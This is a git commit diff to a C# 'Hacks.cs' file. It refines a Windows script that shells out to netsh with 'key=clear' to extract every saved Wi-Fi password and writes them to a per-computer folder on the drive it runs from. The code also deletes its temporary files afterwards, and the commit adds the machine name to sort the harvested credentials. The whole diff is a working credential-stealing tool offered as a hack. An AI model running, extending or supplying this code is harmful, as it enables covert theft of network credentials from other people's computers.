85f0970a69828af6868819894fec1df83e8af496
André Soares França <andre.franca@globalweb.com.br>
2019-09-03 10:50:20 -0400

    -Added computer name -Removed residual files

--- console-of-all-functions/libraries/hacks/Hacks.cs
+++ console-of-all-functions/libraries/hacks/Hacks.cs
@@ -19,19 +19,22 @@ namespace console_of_all_functions.libraries.hacks
                 string createWifiFile = "/c netsh wlan show profiles & find \"" + "Todos" + "\">wifiNames.txt";
                 System.Diagnostics.Process.Start("CMD.exe", createWifiFile);
                 var lines = File.ReadAllLines("wifiNames.txt", Encoding.UTF8);
-                var output = File.CreateText(Directory.GetCurrentDirectory().Substring(0,2) +"\\Data\\wifiPasswords.txt");
+                string device = Directory.GetCurrentDirectory().Substring(0, 2);
+                string computer = Environment.MachineName;
+                var output = File.CreateText(device + "\\Data\\" + computer + "\\wifiPasswords.txt");
 
                 foreach (var line in lines)
                 {
-                    string getWifiPassword = "/c netsh wlan show profile " + line.Split(':')[1] + " key=clear>wifiInfo.txt";
+                    string wifiName = line.Split(':')[1];
+                    string getWifiPassword = "/c netsh wlan show profile " + wifiName + " key=clear>wifiInfo.txt";
                     System.Diagnostics.Process.Start("CMD.exe", getWifiPassword);
                     var info = File.ReadAllLines("wifiInfo.txt", Encoding.UTF8).ToList();
-                    string fileWrite = "Wifi name: " + line.Split(':')[1] + "  Password: " + info.Where(x => x.Contains("Conteúdo da Chave")).First().Split(':')[1];
+                    string fileWrite = "Wifi name: " + wifiName + "  Password: " + info.Where(x => x.Contains("Conteúdo da Chave")).First().Split(':')[1];
                     output.WriteLine(fileWrite);
                 }
 
                 output.Close();
-                File.Delete(Directory.GetCurrentDirectory()+"\\wifiNames.txt");
+                File.Delete(Directory.GetCurrentDirectory() + "\\wifiNames.txt");
                 File.Delete(Directory.GetCurrentDirectory() + "\\wifiInfo.txt");
                 Console.WriteLine("Success");
             }
